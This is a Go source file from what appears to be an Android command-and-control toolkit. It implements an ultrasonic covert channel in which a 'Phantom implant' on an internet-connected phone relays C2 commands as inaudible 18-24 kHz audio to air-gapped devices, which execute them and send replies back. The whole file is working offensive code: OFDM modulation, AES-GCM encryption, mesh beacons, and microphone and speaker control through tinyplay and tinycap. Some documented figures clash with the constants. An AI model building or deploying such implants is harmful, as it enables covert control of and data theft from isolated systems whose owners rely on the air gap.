// //go:build android

package covert

/*
	SUDOSOC-C2 — Ultrasonic Mesh Network (MOSQUITO/FANSMITTER class)
	Copyright (C) 2026  sudosoc — Seif

	Air-gap bridging via ultrasonic audio covert channel.
	No internet. No WiFi. No Bluetooth. No visible signals.
	Just speakers and microphones operating at 18-24 kHz —
	inaudible to humans, invisible to every network monitor.

	Academic basis:
	  MOSQUITO (2018) — Ben-Gurion University
	  GSMem, DiskFiltration, AirHopper (same lab)
	  FANSMITTER — CPU fan as acoustic transmitter

	Architecture:
	  Device A (internet-connected, Phantom implant)
	    ← receives C2 commands from server
	    → encodes commands as ultrasonic bursts
	    → transmits via speaker at 20kHz

	  Device B (air-gapped, 0-8m away)
	    → microphone captures 20kHz signal
	    → decodes commands
	    → executes
	    → encodes response at 22kHz
	    → transmits back

	Encoding: OFDM (Orthogonal Frequency Division Multiplexing)
	  Multiple sub-carriers at 18kHz, 19kHz, 20kHz, 21kHz, 22kHz
	  Each sub-carrier carries 1 bit simultaneously
	  Throughput: ~100 bps (enough for commands and short data)

	Android audio access:
	  Microphone: AudioRecord with SAMPLE_RATE_HZ=48000
	  Speaker:    AudioTrack with same rate
	  Ultrasonic range: 18000-24000 Hz (well within 48kHz Nyquist)
*/

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"math"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

const (
	sampleRate   = 48000 // Hz — Android standard, supports ultrasonic
	bitsPerFrame = 5     // 5 OFDM sub-carriers = 5 bits per symbol
	symbolDur    = 0.02  // 20ms per symbol → 250 bps theoretical

	// OFDM sub-carrier frequencies (Hz)
	carrier0 = 18500.0
	carrier1 = 19000.0
	carrier2 = 19500.0
	carrier3 = 20000.0
	carrier4 = 20500.0

	preamble = 0xAA55AA55 // sync word
)

// UltrasonicC2 manages air-gap communication via ultrasound
type UltrasonicC2 struct {
	AESKey       []byte
	OutputDir    string
	Role         NodeRole
	SelfID       uint8

	mu           sync.Mutex
	rxBuffer     []byte
	txQueue      [][]byte
	meshPeers    map[uint8]*MeshPeer // discovered peers
	isRunning    bool
}

// NodeRole represents this device's role in the mesh
type NodeRole int

const (
	RoleGateway  NodeRole = iota // has internet, forwards C2 commands
	RoleEndpoint NodeRole = iota // air-gapped, receives commands
	RoleRelay    NodeRole = iota // neither — relays between nodes
)

// MeshPeer represents a discovered ultrasonic peer
type MeshPeer struct {
	ID           uint8
	LastSeen     time.Time
	SignalLevel  float64
	HopsToGW     int
}

// NewUltrasonicC2 creates a new ultrasonic C2 channel
func NewUltrasonicC2(role NodeRole, selfID uint8, aesKey []byte, outputDir string) *UltrasonicC2 {
	os.MkdirAll(outputDir, 0700)
	return &UltrasonicC2{
		AESKey:    aesKey,
		OutputDir: outputDir,
		Role:      role,
		SelfID:    selfID,
		meshPeers: make(map[uint8]*MeshPeer),
	}
}

// Start begins ultrasonic operation
func (u *UltrasonicC2) Start(stop chan struct{}) error {
	u.isRunning = true

	// Start receiver
	go u.rxLoop(stop)

	// Start transmitter
	go u.txLoop(stop)

	// Start mesh beacon (announce our presence)
	go u.beaconLoop(stop)

	return nil
}

// Send queues data for ultrasonic transmission
func (u *UltrasonicC2) Send(data []byte) error {
	encrypted, err := u.encrypt(data)
	if err != nil {
		return err
	}
	frame := u.buildFrame(encrypted)
	u.mu.Lock()
	u.txQueue = append(u.txQueue, frame)
	u.mu.Unlock()
	return nil
}

// Receive returns the next received message (blocks until available)
func (u *UltrasonicC2) Receive(timeout time.Duration) ([]byte, error) {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		u.mu.Lock()
		if len(u.rxBuffer) > 0 {
			data := u.rxBuffer
			u.rxBuffer = nil
			u.mu.Unlock()
			return u.decrypt(data)
		}
		u.mu.Unlock()
		time.Sleep(50 * time.Millisecond)
	}
	return nil, nil
}

// ── Transmission ──────────────────────────────────────────────────

func (u *UltrasonicC2) txLoop(stop chan struct{}) {
	for {
		select {
		case <-stop:
			return
		default:
			u.mu.Lock()
			if len(u.txQueue) > 0 {
				frame := u.txQueue[0]
				u.txQueue = u.txQueue[1:]
				u.mu.Unlock()
				u.transmitFrame(frame)
			} else {
				u.mu.Unlock()
				time.Sleep(10 * time.Millisecond)
			}
		}
	}
}

// transmitFrame converts bytes to audio samples and plays them
func (u *UltrasonicC2) transmitFrame(frame []byte) {
	samples := u.encodeOFDM(frame)
	u.playAudio(samples)
}

// encodeOFDM encodes data as OFDM symbols at ultrasonic frequencies
func (u *UltrasonicC2) encodeOFDM(data []byte) []float64 {
	carriers := []float64{carrier0, carrier1, carrier2, carrier3, carrier4}
	symbolSamples := int(symbolDur * sampleRate)
	var allSamples []float64

	// Preamble: known pattern for sync
	allSamples = append(allSamples, u.generatePreamble(symbolSamples)...)

	// Data bits: encode 5 bits per OFDM symbol
	bits := bytesToBits(data)
	for i := 0; i < len(bits); i += bitsPerFrame {
		symbolBits := make([]int, bitsPerFrame)
		for j := 0; j < bitsPerFrame && i+j < len(bits); j++ {
			symbolBits[j] = bits[i+j]
		}

		// Generate OFDM symbol
		symbol := make([]float64, symbolSamples)
		for sampleIdx := 0; sampleIdx < symbolSamples; sampleIdx++ {
			t := float64(sampleIdx) / sampleRate
			sample := 0.0
			for bit, freq := range carriers {
				if symbolBits[bit] == 1 {
					sample += math.Sin(2 * math.Pi * freq * t)
				}
			}
			symbol[sampleIdx] = sample / float64(bitsPerFrame) // normalize
		}
		allSamples = append(allSamples, symbol...)
	}

	// Guard interval (silence)
	guard := make([]float64, symbolSamples/4)
	allSamples = append(allSamples, guard...)

	return allSamples
}

func (u *UltrasonicC2) generatePreamble(symbolSamples int) []float64 {
	// Chirp sweep from 18kHz to 22kHz — easy to detect, robust to noise
	preamble := make([]float64, symbolSamples*2)
	for i := range preamble {
		t := float64(i) / sampleRate
		progress := float64(i) / float64(len(preamble))
		freq := 18000 + progress*4000 // 18kHz → 22kHz
		preamble[i] = math.Sin(2 * math.Pi * freq * t)
	}
	return preamble
}

// playAudio outputs audio samples via Android's audio system
func (u *UltrasonicC2) playAudio(samples []float64) {
	// Convert to 16-bit PCM
	pcm := make([]byte, len(samples)*2)
	for i, s := range samples {
		// Scale to 30% amplitude (inaudible but detectable at close range)
		val := int16(s * 0.3 * math.MaxInt16)
		binary.LittleEndian.PutUint16(pcm[i*2:], uint16(val))
	}

	// Write to audio pipe (Android audio HAL)
	// In production APK: use AudioTrack Java API
	tmpFile := filepath.Join(u.OutputDir, "tx.pcm")
	os.WriteFile(tmpFile, pcm, 0600)

	// Play via tinyplay (available on many Android devices)
	exec.Command("tinyplay", tmpFile,
		"-r", fmt.Sprintf("%d", sampleRate),
		"-c", "1",
		"-b", "16").Run()

	os.Remove(tmpFile)
}

// ── Reception ─────────────────────────────────────────────────────

func (u *UltrasonicC2) rxLoop(stop chan struct{}) {
	for {
		select {
		case <-stop:
			return
		default:
			// Record audio in 500ms chunks
			samples := u.recordAudio(500 * time.Millisecond)
			if samples == nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}

			// Detect preamble
			if offset := u.detectPreamble(samples); offset >= 0 {
				// Decode OFDM from detected offset
				data := u.decodeOFDM(samples[offset:])
				if data != nil && len(data) > 0 {
					u.mu.Lock()
					u.rxBuffer = append(u.rxBuffer, data...)
					u.mu.Unlock()
					u.logReceived(data)
				}
			}
		}
	}
}

// recordAudio captures audio from the microphone
func (u *UltrasonicC2) recordAudio(duration time.Duration) []float64 {
	tmpFile := filepath.Join(u.OutputDir, "rx.pcm")
	durationSec := duration.Seconds()

	// Record via tinycap (available on Android)
	cmd := exec.Command("tinycap", tmpFile,
		"-r", fmt.Sprintf("%d", sampleRate),
		"-c", "1",
		"-b", "16",
		"-T", fmt.Sprintf("%d", int(durationSec*1000)))
	if err := cmd.Run(); err != nil {
		return nil
	}
	defer os.Remove(tmpFile)

	data, err := os.ReadFile(tmpFile)
	if err != nil || len(data) < 2 {
		return nil
	}

	// Convert PCM bytes to float64
	samples := make([]float64, len(data)/2)
	for i := range samples {
		val := int16(binary.LittleEndian.Uint16(data[i*2:]))
		samples[i] = float64(val) / math.MaxInt16
	}
	return samples
}

// detectPreamble finds the chirp preamble in the audio stream
func (u *UltrasonicC2) detectPreamble(samples []float64) int {
	windowSize := int(symbolDur * 2 * sampleRate)
	threshold := 0.15 // correlation threshold

	for i := 0; i < len(samples)-windowSize; i += windowSize / 4 {
		window := samples[i : i+windowSize]
		energy := u.computeUltrasonicEnergy(window)
		if energy > threshold {
			return i
		}
	}
	return -1
}

// computeUltrasonicEnergy computes energy in ultrasonic frequency band
func (u *UltrasonicC2) computeUltrasonicEnergy(samples []float64) float64 {
	// Simple band-pass filter around our carrier frequencies
	energy := 0.0
	for i, s := range samples {
		t := float64(i) / sampleRate
		// Demodulate each carrier
		for _, freq := range []float64{carrier0, carrier1, carrier2, carrier3, carrier4} {
			energy += s * math.Sin(2*math.Pi*freq*t)
		}
	}
	return math.Abs(energy) / float64(len(samples))
}

// decodeOFDM recovers bits from OFDM symbols
func (u *UltrasonicC2) decodeOFDM(samples []float64) []byte {
	carriers := []float64{carrier0, carrier1, carrier2, carrier3, carrier4}
	symbolSamples := int(symbolDur * sampleRate)
	var bits []int

	i := 0
	for i+symbolSamples <= len(samples) {
		symbol := samples[i : i+symbolSamples]
		for _, freq := range carriers {
			// Compute correlation with this carrier frequency
			corr := 0.0
			for sIdx, s := range symbol {
				t := float64(sIdx) / sampleRate
				corr += s * math.Sin(2*math.Pi*freq*t)
			}
			corr /= float64(len(symbol))

			if corr > 0.05 {
				bits = append(bits, 1)
			} else {
				bits = append(bits, 0)
			}
		}
		i += symbolSamples
	}

	return bitsToBytes(bits)
}

// ── Mesh Operations ───────────────────────────────────────────────

// beaconLoop periodically announces our presence to peers
func (u *UltrasonicC2) beaconLoop(stop chan struct{}) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-stop:
			return
		case <-ticker.C:
			beacon := u.buildBeacon()
			u.Send(beacon)
		}
	}
}

// buildBeacon creates a mesh beacon packet
func (u *UltrasonicC2) buildBeacon() []byte {
	pkt := make([]byte, 8)
	pkt[0] = 0xBC           // beacon type
	pkt[1] = u.SelfID       // our ID
	pkt[2] = byte(u.Role)   // our role
	binary.BigEndian.PutUint32(pkt[4:8], uint32(time.Now().Unix()))
	return pkt
}

// buildFrame adds header to data for transmission
func (u *UltrasonicC2) buildFrame(data []byte) []byte {
	frame := make([]byte, 8+len(data))
	binary.BigEndian.PutUint32(frame[0:4], preamble)
	binary.BigEndian.PutUint16(frame[4:6], uint16(len(data)))
	frame[6] = u.SelfID
	frame[7] = 0x00 // flags
	copy(frame[8:], data)
	return frame
}

func (u *UltrasonicC2) logReceived(data []byte) {
	f, _ := os.OpenFile(filepath.Join(u.OutputDir, "ultrasonic_rx.log"),
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if f != nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf("[%s] Received %d bytes\n",
			time.Now().Format("15:04:05"), len(data)))
	}
}

func (u *UltrasonicC2) encrypt(data []byte) ([]byte, error) {
	block, _ := aes.NewCipher(u.AESKey)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	return gcm.Seal(nonce, nonce, data, nil), nil
}

func (u *UltrasonicC2) decrypt(data []byte) ([]byte, error) {
	block, _ := aes.NewCipher(u.AESKey)
	gcm, _ := cipher.NewGCM(block)
	ns := gcm.NonceSize()
	if len(data) < ns {
		return nil, fmt.Errorf("too short")
	}
	return gcm.Open(nil, data[:ns], data[ns:], nil)
}

func bytesToBits(data []byte) []int {
	bits := make([]int, len(data)*8)
	for i, b := range data {
		for j := 0; j < 8; j++ {
			bits[i*8+j] = int((b >> uint(7-j)) & 1)
		}
	}
	return bits
}

func bitsToBytes(bits []int) []byte {
	if len(bits)%8 != 0 {
		bits = append(bits, make([]int, 8-len(bits)%8)...)
	}
	data := make([]byte, len(bits)/8)
	for i := range data {
		for j := 0; j < 8; j++ {
			if i*8+j < len(bits) && bits[i*8+j] == 1 {
				data[i] |= 1 << uint(7-j)
			}
		}
	}
	return data
}

// GetMeshStatus returns the current mesh network status
func (u *UltrasonicC2) GetMeshStatus() string {
	u.mu.Lock()
	defer u.mu.Unlock()

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Ultrasonic Mesh Node: ID=%d Role=%d\n", u.SelfID, u.Role))
	sb.WriteString(fmt.Sprintf("Peers discovered: %d\n", len(u.meshPeers)))
	for id, peer := range u.meshPeers {
		sb.WriteString(fmt.Sprintf("  Peer %d: last seen %v, signal=%.2f, hops=%d\n",
			id, peer.LastSeen.Format("15:04:05"), peer.SignalLevel, peer.HopsToGW))
	}
	return sb.String()
}
